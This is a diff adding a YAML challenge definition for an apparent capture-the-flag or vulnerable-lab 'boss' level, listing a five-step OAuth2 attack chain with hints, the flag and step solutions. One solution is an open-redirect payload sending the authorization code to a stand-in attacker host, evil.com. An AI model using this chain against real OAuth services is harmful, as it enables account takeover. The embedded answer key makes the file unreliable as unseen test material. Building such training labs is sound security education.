@@ -1,0 +1,38 @@
+id: boss-medusa
+title: "MEDUSA — Look Into the Mirror"
+category: boss
+difficulty: boss
+cvss: 9.6
+owasp: A07:2021 – Identification and Authentication Failures
+endpoint: /boss/medusa
+description: "A 5-step boss chain exploiting OAuth2 misconfigurations. The user must chain OAuth2 CSRF, code interception, token forgery, scope escalation, and session fixation."
+hints:
+  - "Step 1: OAuth2 CSRF — no state parameter allows binding your account to attacker session."
+  - "Step 2: Intercept OAuth2 authorization code via open redirect."
+  - "Step 3: Forge JWT access token with modified scope."
+  - "Step 4: Escalate privileges via implicit grant flow."
+  - "Step 5: Fixate session after privilege escalation."
+flag: "BHEDA{boss_medusa_complete}"
+flag_location: "Admin dashboard after OAuth2 chain exploitation"
+solution_summary: "CSRF -> code interception via open redirect -> JWT scope modification -> implicit grant escalation -> session fixation"
+steps:
+  - id: medusa-1
+    description: "OAuth2 CSRF binds victim to attacker account"
+    endpoint: /boss/medusa/oauth/authorize
+    solution: "Craft auth request without state param, intercept callback"
+  - id: medusa-2
+    description: "Open redirect steals authorization code"
+    endpoint: /boss/medusa/redirect
+    solution: "/redirect?url=https://evil.com/capture"
+  - id: medusa-3
+    description: "JWT token scope escalation"
+    endpoint: /boss/medusa/oauth/token
+    solution: "Modify scope from user to admin in JWT payload"
+  - id: medusa-4
+    description: "Implicit grant privilege escalation"
+    endpoint: /boss/medusa/oauth/implicit
+    solution: "Use #fragment with admin token"
+  - id: medusa-5
+    description: "Session fixation after escalation"
+    endpoint: /boss/medusa/session
+    solution: "Set session cookie before auth, session persists after login"
